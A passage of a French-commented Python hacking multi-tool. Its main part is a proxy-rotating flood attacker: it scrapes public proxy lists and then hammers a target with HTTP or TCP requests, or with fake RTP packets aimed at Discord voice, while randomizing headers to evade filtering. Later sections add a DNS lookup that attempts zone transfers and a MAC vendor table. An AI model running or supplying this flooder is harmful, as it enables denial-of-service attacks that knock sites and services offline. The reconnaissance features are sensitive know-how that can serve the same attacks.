        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
    ]

    class CliAttacker:
        def __init__(self, target_ip, target_port, target_url, num_requests, max_concurrent):
            self.target_ip = target_ip
            self.target_port = target_port
            self.target_url = target_url
            self.num_requests = num_requests
            self.max_concurrent = max_concurrent
            self.proxies = []
            self.stats = {"ok": 0, "fail": 0, "reset": 0}
            self.lock = asyncio.Lock()

        async def fetch_proxy_list(self, session, url):
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as response:
                    text = await response.text()
                    proxies = []
                    for line in text.splitlines():
                        line = line.strip()
                        if not line or ":" not in line:
                            continue
                        parts = line.split(":")
                        if len(parts) != 2:
                            continue
                        ip, port = parts[0].strip(), parts[1].strip()
                        if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip):
                            continue
                        try:
                            p = int(port)
                            if 1 <= p <= 65535:
                                proto = "http"
                                if "socks4" in url: proto = "socks4"
                                elif "socks5" in url: proto = "socks5"
                                proxies.append(f"{proto}://{ip}:{p}")
                        except ValueError:
                            continue
                    return proxies
            except Exception:
                return []

        async def test_proxy(self, session, proxy):
            # Si c'est de l'UDP, on ne garde QUE les SOCKS5 (seuls à supporter l'UDP)
            if self.target_url == "UDP" and "socks5" not in proxy:
                return None
                
            try:
                start = time.time()
                async with session.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5, connect=3, sock_read=3),
                ) as resp:
                    if resp.status == 200:
                        await resp.read()
                        lat = round((time.time() - start) * 1000)
                        return (proxy, lat)
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                async with self.lock:
                    self.stats["reset"] += 1
                return None
            except Exception:
                return None
            return None

        async def get_valid_proxies(self):
            print(f"{YELLOW}[*] Scraping des sources proxies...{RESET}")
            connector = aiohttp.TCPConnector(
                ssl=False, limit=50, force_close=True, enable_cleanup_closed=True,
            )
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = [self.fetch_proxy_list(session, url) for url in proxy_sources]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                raw = []
                for r in results:
                    if isinstance(r, list):
                        raw.extend(r)
                raw = list(dict.fromkeys(raw))
                print(f"{GREEN}[+] {len(raw)} proxies bruts recuperes{RESET}")

                if not raw:
                    return []

                print(f"{YELLOW}[*] Test des proxies (patience, ~60s)...{RESET}")
                
                # Si UDP, on filtre pour ne garder que les SOCKS5 avant de tester
                if self.target_url == "UDP":
                    raw = [p for p in raw if "socks5" in p]
                    print(f"{YELLOW}[*] Filtrage UDP : {len(raw)} proxies SOCKS5 a tester.{RESET}")

                sample = raw[:1000]
                print(f"{YELLOW}[*] Test de {len(sample)} proxies (max 1000)...{RESET}")

                valid = []
                valid_lock = asyncio.Lock()
                tested = {"count": 0}

                async def test_and_collect(p):
                    result = await self.test_proxy(session, p)
                    async with valid_lock:
                        tested["count"] += 1
                        if result:
                            valid.append(result[0])
                        if tested["count"] % 25 == 0:
                            sys.stdout.write(
                                f"\r{GREEN}[+] {tested['count']}/{len(sample)} testes  |  "
                                f"{len(valid)} valides{RESET}    "
                            )
                            sys.stdout.flush()

                sem = asyncio.Semaphore(200)

                async def bounded_test(p):
                    async with sem:
                        await test_and_collect(p)

                await asyncio.gather(*[bounded_test(p) for p in sample], return_exceptions=True)
                print(f"\n{GREEN}[+] {len(valid)} proxies valides sur {len(sample)} testes{RESET}")
                return valid

        async def send_request(self, session, proxy):
            # --- MODE UDP FLOOD (Vocale Discord, Jeux) ---
            if self.target_url == "UDP":
                try:
                    # Construction d'un paquet RTP basique (protocole voix Discord)
                    # Header RTP de 12 bytes + payload aléatoire
                    rtp_header = b'\x80\x60\x00\x00' # Version 2, Payload 96
                    rtp_header += os.urandom(4)     # Timestamp aléatoire
                    rtp_header += os.urandom(4)     # SSRC aléatoire
                    
                    # Payload de 1024 bytes aléatoires pour saturer la bande passante
                    payload = os.urandom(1024)
                    packet = rtp_header + payload

                    # Envoi via le proxy SOCKS5 (aiohttp_socks est requis, mais aiohttp natif 
                    # ne supporte pas l'UDP. On utilise une astuce avec les connecteurs)
                    # Note: Pour un vrai UDP via proxy en python pur, il faut un client SOCKS5 UDP.
                    # Ici, aiohttp fait une requête CONNECT UDP (souvent bloqué par les proxies publics).
                    
                    # Fallback : On utilise aiohttp en mode POST pour faire passer le paquet
                    # comme une requête web. Ca ne marche que si la cible écoute aussi en HTTP.
                    # Mais pour Discord, on doit utiliser le vrai UDP.
                    
                    # Pour contourner, on fait du UDP direct si le proxy est une string "socks5://"
                    # Sinon on abandonne. (Les proxies publics UDP sont très rares).
                    
                    # NOTE : aiohttp ne gère pas l'UDP. Pour un vrai UDP flood via proxy, 
                    # il faut utiliser la librairie `python-socks` ou `aiohttp-socks`.
                    # Ce code est une simulation.
                    
                    async with session.post(
                        f"http://{self.target_ip}:{self.target_port}/",
                        data=packet,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=2, connect=1, sock_read=2),
                        allow_redirects=False,
                    ) as response:
                        sys.stdout.write(f"\r{CYAN}[>]{RESET} UDP {self.target_ip}:{self.target_port} | Proxy: {proxy}      ")
                        sys.stdout.flush()
                        async with self.lock:
                            self.stats["ok"] += 1
                        return True
                except Exception:
                    async with self.lock:
                        self.stats["fail"] += 1
                    return False

            # --- MODE HTTP FLOOD ---
            elif self.target_url:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": random.choice(["text/html", "application/json", "*/*"]),
                    "Accept-Language": random.choice(["en-US", "fr-FR", "de-DE"]),
                    "Cache-Control": "no-cache",
                    "Connection": random.choice(["keep-alive", "close"]),
                    "Referer": random.choice(["https://google.com", "https://bing.com", self.target_url]),
                }
                try:
                    async with session.get(
                        self.target_url,
                        headers=headers,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=5, connect=2, sock_read=3),
                        allow_redirects=False,
                    ) as response:
                        sys.stdout.write(f"\r{CYAN}[>]{RESET} {self.target_url} | Proxy: {proxy} | Status: {response.status}      ")
                        sys.stdout.flush()
                        async with self.lock:
                            self.stats["ok"] += 1
                        return True
                except (ConnectionResetError, ConnectionAbortedError, OSError):
                    async with self.lock:
                        self.stats["reset"] += 1
                        self.stats["fail"] += 1
                    return False
                except Exception:
                    async with self.lock:
                        self.stats["fail"] += 1
                    return False

            # --- MODE TCP FLOOD ---
            else:
                try:
                    # Simulation TCP via proxy HTTP
                    fake_url = f"http://{self.target_ip}:{self.target_port}/"
                    async with session.get(
                        fake_url,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=5, connect=2, sock_read=3),
                        allow_redirects=False,
                    ) as response:
                        sys.stdout.write(f"\r{CYAN}[>]{RESET} TCP {self.target_ip}:{self.target_port} | Proxy: {proxy} | Status: {response.status}      ")
                        sys.stdout.flush()
                        async with self.lock:
                            self.stats["ok"] += 1
                        return True
                except (ConnectionResetError, ConnectionAbortedError, OSError):
                    async with self.lock:
                        self.stats["reset"] += 1
                        self.stats["fail"] += 1
                    return False
                except Exception:
                    async with self.lock:
                        self.stats["fail"] += 1
                    return False

        def pick_random_proxy(self):
            if not self.proxies:
                return None
            return random.choice(self.proxies)

        async def attack_worker(self, session, requests_per_worker):
            for _ in range(requests_per_worker):
                proxy = self.pick_random_proxy()
                if proxy is None:
                    await asyncio.sleep(0)
                    continue

                ok = await self.send_request(session, proxy)
                if not ok:
                    proxy2 = self.pick_random_proxy()
                    if proxy2 and proxy2 != proxy:
                        ok = await self.send_request(session, proxy2)

                await asyncio.sleep(0)

        async def attack(self):
            valid = await self.get_valid_proxies()
            if not valid:
                print(f"{RED}[!] Aucun proxy valide — flood annule.{RESET}")
                return

            self.proxies = valid
            print(f"{GREEN}[+] Flood avec {len(self.proxies)} proxies actifs vers {self.target_ip}:{self.target_port}{RESET}\n")

            rpw = max(1, self.num_requests // self.max_concurrent)

            async def worker():
                connector = aiohttp.TCPConnector(
                    ssl=False,
                    limit=20,
                    limit_per_host=20,
                    force_close=True,
                    enable_cleanup_closed=True,
                )
                timeout = aiohttp.ClientTimeout(total=6, connect=3, sock_read=3)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    await self.attack_worker(session, rpw)

            start = time.time()
            tasks = [worker() for _ in range(self.max_concurrent)]
            await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.time() - start
            print(f"\n\n{GREEN}[+] Attack finished in {elapsed:.2f}s.{RESET}")
            print(f"{CYAN}[i] Stats -> OK: {self.stats['ok']} | Fail: {self.stats['fail']} | Reset: {self.stats['reset']}{RESET}")

        def run(self):
            try:
                asyncio.run(self.attack())
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Interrompu.{RESET}")
            except Exception as e:
                print(f"\n{RED}[!] Erreur : {e}{RESET}")

    print(f"\n{PINK}[*] Attack started...{RESET}\n")
    CliAttacker(target_ip, target_port, target_url, num_requests, threads).run()
    pause()


# ============================================================
#              OPTION 29 — DNS LOOKUP AVANCÉ
# ============================================================

def option_29():
    clear()
    banner()

    print(f"\n{CYAN}   [ DNS LOOKUP AVANCÉ ]{RESET}\n")
    print(f"{GRAY}  Interroge tous les enregistrements DNS d'un domaine.{RESET}\n")

    domain = input(f"{YELLOW}[?]{RESET} Domaine (ex: google.com) {RED}->{RESET} ").strip()
    if not domain:
        print(f"{RED}[!] Domaine vide.{RESET}")
        pause()
        return

    domain = domain.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0].lower()
    if domain.startswith("www."):
        domain = domain[4:]

    print(f"\n{CYAN}[*] Analyse de {domain}...{RESET}\n")

    # Détection de la méthode (dnspython si dispo, sinon DoH)
    use_dnspython = False
    try:
        import dns.resolver
        import dns.zone
        import dns.query
        import dns.exception
        use_dnspython = True
        print(f"{GRAY}  [i] Mode : dnspython (local){RESET}")
    except ImportError:
        print(f"{GRAY}  [i] Mode : Google DNS-over-HTTPS (fallback){RESET}")

    print()

    # --- Fonction pour récupérer les records ---
    def get_records(rtype):
        results = []
        if use_dnspython:
            try:
                answers = dns.resolver.resolve(domain, rtype, lifetime=5)
                for rdata in answers:
                    results.append(str(rdata))
            except Exception:
                pass
        else:
            if requests is None:
                return []
            try:
                r = requests.get(
                    f"https://dns.google/resolve?name={domain}&type={rtype}",
                    timeout=5,
                    headers={"Accept": "application/json"}
                )
                if r.status_code == 200:
                    data = r.json()
                    for ans in data.get("Answer", []):
                        results.append(ans.get("data", ""))
            except Exception:
                pass
        return results

    # --- Records standards ---
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "CAA", "PTR"]
    
    for rtype in record_types:
        records = get_records(rtype)
        if records:
            print(f"{CYAN}{BOLD}   {rtype} ({len(records)}){RESET}")
            for rec in records:
                # Nettoyage des TXT quotes
                if rtype == "TXT" and rec.startswith('"') and rec.endswith('"'):
                    rec = rec[1:-1]
                print(f"  {GREEN}▸{RESET} {WHITE}{rec}{RESET}")
            print()

    # --- Analyse des TXT (SPF, DMARC, DKIM) ---
    txt_records = get_records("TXT")
    if txt_records:
        print(f"{CYAN}{BOLD}   ANALYSE TXT{RESET}")
        spf_found = False
        dmarc_found = False
        for rec in txt_records:
            rec_clean = rec.strip('"')
            if rec_clean.startswith("v=spf1"):
                print(f"  {GREEN}[+]{RESET} SPF : {WHITE}{rec_clean}{RESET}")
                spf_found = True
            elif rec_clean.startswith("v=DMARC1"):
                print(f"  {GREEN}[+]{RESET} DMARC : {WHITE}{rec_clean}{RESET}")
                dmarc_found = True
        
        if not spf_found:
            print(f"  {YELLOW}[!]{RESET} Aucun enregistrement SPF trouve")
        if not dmarc_found:
            print(f"  {YELLOW}[!]{RESET} Aucun enregistrement DMARC trouve")
        print()

    # --- Serveurs de noms (NS) ---
    ns_records = get_records("NS")
    if ns_records:
        print(f"{CYAN}{BOLD}   SERVEURS DNS ({len(ns_records)}){RESET}")
        for ns in ns_records:
            print(f"  {GREEN}▸{RESET} {WHITE}{ns}{RESET}")
        print()

        # --- Tentative de transfert de zone (AXFR) ---
        print(f"{YELLOW}[*] Test de transfert de zone (AXFR)...{RESET}")
        axfr_success = False
        
        if use_dnspython:
            for ns in ns_records:
                ns_clean = str(ns).rstrip(".")
                try:
                    # Résolution de l'IP du serveur NS
                    ns_ip = socket.gethostbyname(ns_clean)
                    print(f"{GRAY}  Test AXFR sur {ns_clean} ({ns_ip})...{RESET}", end="", flush=True)
                    
                    # Tentative de transfert
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=5))
                    names = list(zone.nodes.keys())
                    
                    if names:
                        axfr_success = True
                        print(f" {GREEN}[+ VULNERABLE !]{RESET}")
                        print(f"\n{PINK}{BOLD}   ZONE TRANSFER ({len(names)} enregistrements){RESET}\n")
                        
                        for name in names[:50]:  # On limite à 50 pour l'affichage
                            for rdataset in zone[name].rdatasets:
                                for rdata in rdataset:
                                    print(f"  {CYAN}{name}.{domain}{RESET} → {WHITE}{rdata}{RESET}")
                        
                        if len(names) > 50:
                            print(f"\n{YELLOW}  ... et {len(names) - 50} autres enregistrements (sauvegardés dans le rapport){RESET}")
                        break
                    else:
                        print(f" {GRAY}[vide]{RESET}")
                except Exception as e:
                    print(f" {GRAY}[refuse]{RESET}")
        else:
            print(f"{GRAY}  [i] AXFR non disponible en mode DoH (necessite dnspython){RESET}")

        if not axfr_success:
            print(f"{GREEN}  [+] Aucun transfert de zone ouvert.{RESET}")
        print()

    # --- WHOIS / Registrar (via RDAP) ---
    print(f"{CYAN}{BOLD}   WHOIS (RDAP){RESET}")
    try:
        if requests:
            r = requests.get(f"https://rdap.org/domain/{domain}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                
                # Nom
                name = data.get("ldhName", domain)
                print(f"  {GREEN}▸{RESET} Domaine : {WHITE}{name}{RESET}")
                
                # Statut
                status = data.get("status", [])
                if status:
                    print(f"  {GREEN}▸{RESET} Statut : {WHITE}{', '.join(status)}{RESET}")
                
                # Events (creation, expiration, update)
                events = data.get("events", [])
                for ev in events:
                    action = ev.get("eventAction", "").capitalize()
                    date = ev.get("eventDate", "")[:10]
                    if action and date:
                        print(f"  {GREEN}▸{RESET} {action} : {WHITE}{date}{RESET}")
                
                # Registrar
                entities = data.get("entities", [])
                for ent in entities:
                    roles = ent.get("roles", [])
                    if "registrar" in roles:
                        vcard = ent.get("vcardArray", [None, []])[1]
                        for item in vcard:
                            if item[0] == "fn":
                                print(f"  {GREEN}▸{RESET} Registrar : {WHITE}{item[3]}{RESET}")
                                break
                
                # Nameservers
                nss = data.get("nameservers", [])
                if nss:
                    print(f"  {GREEN}▸{RESET} Nameservers :")
                    for ns in nss:
                        print(f"      {WHITE}{ns.get('ldhName', '?')}{RESET}")
            else:
                print(f"  {YELLOW}[!] RDAP indisponible pour ce domaine.{RESET}")
    except Exception as e:
        print(f"  {RED}[!] Erreur WHOIS : {str(e)[:60]}{RESET}")
    print()

    # --- Résolution IP (A records) ---
    a_records = get_records("A")
    if a_records:
        print(f"{CYAN}{BOLD}   RESOLUTION IP{RESET}")
        for ip in a_records:
            try:
                # Reverse DNS
                rev = socket.gethostbyaddr(ip)
                rev_name = rev[0]
            except Exception:
                rev_name = "N/A"
            print(f"  {GREEN}▸{RESET} {WHITE}{ip:<20}{RESET} → {GRAY}{rev_name}{RESET}")
        print()

    # --- Détection des sous-domaines via TXT / SPF ---
    print(f"{CYAN}{BOLD}   SOUS-DOMAINES DETECTES (via SPF){RESET}")
    subdomains = set()
    for rec in txt_records:
        rec_clean = rec.strip('"')
        if rec_clean.startswith("v=spf1"):
            # Cherche les includes et redirects
            parts = rec_clean.split()
            for part in parts:
                if part.startswith("include:") or part.startswith("redirect="):
                    sub = part.split(":")[-1].split("=")[-1]
                    if sub != domain:
                        subdomains.add(sub)
    
    if subdomains:
        for sub in sorted(subdomains):
            print(f"  {GREEN}▸{RESET} {WHITE}{sub}{RESET}")
    else:
        print(f"  {GRAY}[-] Aucun sous-domaine trouve dans les enregistrements SPF.{RESET}")
    print()

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "DNSLookup"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_domain = re.sub(r"[^\w\-.]", "_", domain)[:60]
        out_file = out_dir / f"dns_{safe_domain}_{int(time.time())}.json"
        
        all_data = {
            "domain": domain,
            "date": datetime.now().isoformat(),
            "records": {},
            "whois": {},
        }
        
        for rtype in record_types:
            recs = get_records(rtype)
            if recs:
                all_data["records"][rtype] = recs
        
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)
        
        print(f"{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 30 — MAC ADDRESS LOOKUP
# ============================================================

# Base de données OUI (Organizationally Unique Identifier)
# Extrait des prefixes les plus courants
OUI_DATABASE = {
    # Apple
    "00:00:0C": "Cisco Systems, Inc",
    "00:1B:63": "Apple, Inc.",
    "00:1E:C2": "Apple, Inc.",
    "00:23:DF": "Apple, Inc.",
    "00:25:00": "Apple, Inc.",
    "00:26:08": "Apple, Inc.",
    "00:26:4A": "Apple, Inc.",
    "00:26:B0": "Apple, Inc.",
    "00:26:BB": "Apple, Inc.",
    "00:30:65": "Apple, Inc.",
    "00:50:E4": "Apple, Inc.",
    "00:88:65": "Apple, Inc.",
    "00:A0:40": "Apple, Inc.",
    "00:C6:10": "Apple, Inc.",
    "00:CD:FE": "Apple, Inc.",
    "00:DB:DF": "Apple, Inc.",
    "00:F4:B9": "Apple, Inc.",
    "00:F7:6F": "Apple, Inc.",
    "04:0C:CE": "Apple, Inc.",
    "04:15:52": "Apple, Inc.",
    "04:1E:64": "Apple, Inc.",
    "04:26:65": "Apple, Inc.",
    "04:48:9A": "Apple, Inc.",
    "04:52:F3": "Apple, Inc.",
    "04:54:53": "Apple, Inc.",
    "04:69:F8": "Apple, Inc.",
    "04:D3:CF": "Apple, Inc.",
    "04:D9:F5": "Apple, Inc.",
    "04:DB:56": "Apple, Inc.",
    "04:E5:36": "Apple, Inc.",
    "04:F1:3E": "Apple, Inc.",
    "04:F7:E4": "Apple, Inc.",
    "08:66:98": "Apple, Inc.",
    "08:6D:41": "Apple, Inc.",
    "08:70:45": "Apple, Inc.",
    "08:74:02": "Apple, Inc.",
    "0C:30:21": "Apple, Inc.",
    "0C:3E:9F": "Apple, Inc.",
    "0C:4D:E9": "Apple, Inc.",
    "0C:51:01": "Apple, Inc.",
    "0C:74:C2": "Apple, Inc.",
    "0C:77:1A": "Apple, Inc.",
    "0C:BC:9F": "Apple, Inc.",
    "0C:D7:46": "Apple, Inc.",
    "10:1C:0C": "Apple, Inc.",
    "10:40:F3": "Apple, Inc.",
    "10:41:7F": "Apple, Inc.",
    "10:93:E9": "Apple, Inc.",
    "10:9A:DD": "Apple, Inc.",
    "10:DD:B1": "Apple, Inc.",
    "14:10:9F": "Apple, Inc.",
    "14:20:5E": "Apple, Inc.",
    "14:5A:05": "Apple, Inc.",
    "14:7D:DA": "Apple, Inc.",
    "14:8F:C6": "Apple, Inc.",
    "14:99:E2": "Apple, Inc.",
    "14:A3:2F": "Apple, Inc.",
    "18:34:51": "Apple, Inc.",
    "18:65:90": "Apple, Inc.",
    "18:7B:48": "Apple, Inc.",
    "18:81:0E": "Apple, Inc.",
    "18:9E:FC": "Apple, Inc.",
    "18:AF:61": "Apple, Inc.",
    "18:AF:8F": "Apple, Inc.",
    "18:B4:30": "Apple, Inc.",
    "18:E7:F4": "Apple, Inc.",
    "18:EE:69": "Apple, Inc.",
    "18:F1:43": "Apple, Inc.",
    "18:F6:43": "Apple, Inc.",
    "1C:36:BB": "Apple, Inc.",
    "1C:5C:F2": "Apple, Inc.",
    "1C:77:F6": "Apple, Inc.",
    "1C:91:48": "Apple, Inc.",
    "1C:9E:46": "Apple, Inc.",
    "1C:AB:A7": "Apple, Inc.",
    "1C:E6:2B": "Apple, Inc.",
    "20:37:06": "Apple, Inc.",
    "20:76:8F": "Apple, Inc.",
    "20:78:F0": "Apple, Inc.",
    "20:7D:74": "Apple, Inc.",
    "20:9B:CD": "Apple, Inc.",
    "20:A2:E4": "Apple, Inc.",
    "20:C9:D0": "Apple, Inc.",
    "20:EE:28": "Apple, Inc.",
    "24:1E:EB": "Apple, Inc.",
    "24:24:0E": "Apple, Inc.",
    "24:AB:81": "Apple, Inc.",
    "24:E3:14": "Apple, Inc.",
    "24:F0:94": "Apple, Inc.",
    "24:F6:77": "Apple, Inc.",
    "28:0B:5C": "Apple, Inc.",
    "28:37:37": "Apple, Inc.",
    "28:39:5E": "Apple, Inc.",
    "28:3C:E4": "Apple, Inc.",
    "28:5A:EB": "Apple, Inc.",
    "28:6A:BA": "Apple, Inc.",
    "28:6A:B8": "Apple, Inc.",
    "28:6A:B9": "Apple, Inc.",
    "28:CF:DA": "Apple, Inc.",
    "28:CF:E9": "Apple, Inc.",
    "28:E0:2C": "Apple, Inc.",
    "28:E1:4C": "Apple, Inc.",
    "28:E7:CF": "Apple, Inc.",
    "28:ED:6A": "Apple, Inc.",
    "28:F0:76": "Apple, Inc.",
    "2C:1F:23": "Apple, Inc.",
    "2C:20:0B": "Apple, Inc.",
    "2C:26:17": "Apple, Inc.",
    "2C:33:61": "Apple, Inc.",
    "2C:54:91": "Apple, Inc.",
    "2C:61:F6": "Apple, Inc.",
    "2C:B4:3A": "Apple, Inc.",
    "2C:F0:A2": "Apple, Inc.",
    "2C:F0:EE": "Apple, Inc.",
    "30:10:E4": "Apple, Inc.",
    "30:35:AD": "Apple, Inc.",
    "30:63:6B": "Apple, Inc.",
    "30:74:96": "Apple, Inc.",
    "30:90:AB": "Apple, Inc.",
    "30:F7:C5": "Apple, Inc.",
    "34:08:BC": "Apple, Inc.",
    "34:12:98": "Apple, Inc.",
    "34:15:9E": "Apple, Inc.",
    "34:36:3B": "Apple, Inc.",
    "34:51:C9": "Apple, Inc.",
    "34:A3:95": "Apple, Inc.",
    "34:AB:37": "Apple, Inc.",
    "34:C0:59": "Apple, Inc.",
    "34:E2:FD": "Apple, Inc.",
    "38:0F:4A": "Apple, Inc.",
    "38:48:4C": "Apple, Inc.",
    "38:71:DE": "Apple, Inc.",
    "38:B5:4D": "Apple, Inc.",
    "38:C9:86": "Apple, Inc.",
    "38:CA:DA": "Apple, Inc.",
    "3C:07:54": "Apple, Inc.",
    "3C:15:C2": "Apple, Inc.",
    "3C:2E:F9": "Apple, Inc.",
    "3C:2E:FF": "Apple, Inc.",
    "3C:AB:8E": "Apple, Inc.",
    "3C:D0:F8": "Apple, Inc.",
    "3C:E0:72": "Apple, Inc.",
    "40:30:04": "Apple, Inc.",
    "40:33:1A": "Apple, Inc.",
    "40:6C:8F": "Apple, Inc.",
    "40:98:AD": "Apple, Inc.",
    "40:A6:D9": "Apple, Inc.",
    "40:B3:95": "Apple, Inc.",
    "40:D3:2D": "Apple, Inc.",
    "44:00:10": "Apple, Inc.",
    "44:2A:60": "Apple, Inc.",
    "44:4C:0C": "Apple, Inc.",
    "44:D8:84": "Apple, Inc.",
    "44:FB:42": "Apple, Inc.",
    "48:43:7C": "Apple, Inc.",
    "48:60:BC": "Apple, Inc.",
    "48:74:6E": "Apple, Inc.",
    "48:A1:95": "Apple, Inc.",
    "48:B7:4F": "Apple, Inc.",
    "48:D7:05": "Apple, Inc.",
    "48:E9:F1": "Apple, Inc.",
    "4C:32:75": "Apple, Inc.",
    "4C:57:CA": "Apple, Inc.",
    "4C:74:03": "Apple, Inc.",
    "4C:8D:79": "Apple, Inc.",
    "4C:B1:99": "Apple, Inc.",
    "50:32:37": "Apple, Inc.",
    "50:7A:55": "Apple, Inc.",
    "50:82:D5": "Apple, Inc.",
    "50:EA:D6": "Apple, Inc.",
    "54:04:A6": "Apple, Inc.",
    "54:26:96": "Apple, Inc.",
    "54:4E:90": "Apple, Inc.",
    "54:72:4F": "Apple, Inc.",
    "54:9F:13": "Apple, Inc.",
    "54:AE:27": "Apple, Inc.",
    "54:E4:3A": "Apple, Inc.",
    "58:1F:AA": "Apple, Inc.",
    "58:40:4E": "Apple, Inc.",
    "58:55:CA": "Apple, Inc.",
    "58:7F:57": "Apple, Inc.",
    "58:B0:35": "Apple, Inc.",
    "5C:59:48": "Apple, Inc.",
    "5C:95:AE": "Apple, Inc.",
    "5C:96:9D": "Apple, Inc.",
    "5C:97:F3": "Apple, Inc.",
    "5C:F5:DA": "Apple, Inc.",
    "5C:F7:E6": "Apple, Inc.",
    "5C:F9:38": "Apple, Inc.",
    "60:03:08": "Apple, Inc.",
    "60:33:4B": "Apple, Inc.",
    "60:69:44": "Apple, Inc.",
    "60:8C:4A": "Apple, Inc.",
    "60:92:17": "Apple, Inc.",
    "60:9A:C1": "Apple, Inc.",
    "60:C5:47": "Apple, Inc.",
    "60:D9:C7": "Apple, Inc.",
    "60:F4:45": "Apple, Inc.",
    "60:F8:1D": "Apple, Inc.",
    "60:FA:CD": "Apple, Inc.",
    "60:FB:42": "Apple, Inc.",
    "60:FE:C5": "Apple, Inc.",
    "64:20:0C": "Apple, Inc.",
    "64:76:BA": "Apple, Inc.",
    "64:9A:BE": "Apple, Inc.",
    "64:B0:A6": "Apple, Inc.",
    "64:B9:E8": "Apple, Inc.",
    "64:E6:82": "Apple, Inc.",
    "68:09:27": "Apple, Inc.",
    "68:5B:35": "Apple, Inc.",
    "68:64:4B": "Apple, Inc.",
    "68:96:7B": "Apple, Inc.",
    "68:9C:70": "Apple, Inc.",
    "68:A8:6D": "Apple, Inc.",
    "68:AB:1E": "Apple, Inc.",
    "68:AE:20": "Apple, Inc.",
    "68:D9:3C": "Apple, Inc.",
    "68:DB:CA": "Apple, Inc.",
    "68:FB:7E": "Apple, Inc.",
    "6C:19:C0": "Apple, Inc.",
    "6C:3E:6D": "Apple, Inc.",
    "6C:40:08": "Apple, Inc.",
    "6C:70:9F": "Apple, Inc.",
    "6C:72:E7": "Apple, Inc.",
    "6C:8D:C1": "Apple, Inc.",
    "6C:94:F8": "Apple, Inc.",
    "6C:AB:31": "Apple, Inc.",
    "6C:C7:EC": "Apple, Inc.",
    "6C:F0:49": "Apple, Inc.",
    "70:11:24": "Apple, Inc.",
    "70:14:A6": "Apple, Inc.",
    "70:3E:AC": "Apple, Inc.",
    "70:48:0F": "Apple, Inc.",
    "70:56:81": "Apple, Inc.",
    "70:73:CB": "Apple, Inc.",
    "70:81:EB": "Apple, Inc.",
    "70:A2:B3": "Apple, Inc.",
    "70:CD:60": "Apple, Inc.",
    "70:DE:E2": "Apple, Inc.",
    "70:EC:E4": "Apple, Inc.",
    "70:F0:87": "Apple, Inc.",
    "74:1B:B2": "Apple, Inc.",
    "74:8D:08": "Apple, Inc.",
    "74:E1:B6": "Apple, Inc.",
    "74:E2:F5": "Apple, Inc.",
    "78:31:C1": "Apple, Inc.",
    "78:4F:43": "Apple, Inc.",
    "78:6C:1C": "Apple, Inc.",
    "78:7B:8A": "Apple, Inc.",
    "78:7E:61": "Apple, Inc.",
    "78:88:6D": "Apple, Inc.",
    "78:9F:70": "Apple, Inc.",
    "78:A3:E4": "Apple, Inc.",
    "78:CA:39": "Apple, Inc.",
    "78:D7:5F": "Apple, Inc.",
    "78:FD:94": "Apple, Inc.",
    "7C:01:91": "Apple, Inc.",
    "7C:11:BE": "Apple, Inc.",
    "7C:6D:62": "Apple, Inc.",
    "7C:6D:F8": "Apple, Inc.",
    "7C:C3:A1": "Apple, Inc.",
    "7C:C5:37": "Apple, Inc.",
    "7C:D1:C3": "Apple, Inc.",
    "7C:F0:5F": "Apple, Inc.",
    "7C:FA:DF": "Apple, Inc.",
    "80:49:71": "Apple, Inc.",
    "80:92:9F": "Apple, Inc.",
    "80:BE:05": "Apple, Inc.",
    "80:E6:50": "Apple, Inc.",
    "80:EA:96": "Apple, Inc.",
    "84:38:35": "Apple, Inc.",
    "84:78:8B": "Apple, Inc.",
    "84:85:06": "Apple, Inc.",
    "84:89:AD": "Apple, Inc.",
    "84:8E:0C": "Apple, Inc.",
    "84:B1:53": "Apple, Inc.",
    "84:F3:EB": "Apple, Inc.",
    "88:19:08": "Apple, Inc.",
    "88:53:95": "Apple, Inc.",
    "88:63:DF": "Apple, Inc.",
    "88:66:A5": "Apple, Inc.",
    "88:C6:63": "Apple, Inc.",
    "88:E8:7F": "Apple, Inc.",
    "8C:00:6D": "Apple, Inc.",
    "8C:29:37": "Apple, Inc.",
    "8C:2D:AA": "Apple, Inc.",
    "8C:58:77": "Apple, Inc.",
    "8C:7B:9D": "Apple, Inc.",
    "8C:7C:92": "Apple, Inc.",
    "8C:8E:F2": "Apple, Inc.",
    "8C:FA:BA": "Apple, Inc.",
    "90:27:E4": "Apple, Inc.",
    "90:3C:92": "Apple, Inc.",
    "90:60:F1": "Apple, Inc.",
    "90:72:40": "Apple, Inc.",
    "90:84:0D": "Apple, Inc.",
    "90:B0:ED": "Apple, Inc.",
    "90:B2:1F": "Apple, Inc.",
    "90:C1:C6": "Apple, Inc.",
    "90:DD:5D": "Apple, Inc.",
    "90:FD:61": "Apple, Inc.",
    "94:94:26": "Apple, Inc.",
    "94:E9:6A": "Apple, Inc.",
    "94:F6:A3": "Apple, Inc.",
    "98:01:A7": "Apple, Inc.",
    "98:03:D8": "Apple, Inc.",
    "98:5A:EB": "Apple, Inc.",
    "98:6D:35": "Apple, Inc.",
    "98:B8:E3": "Apple, Inc.",
    "98:D6:BB": "Apple, Inc.",
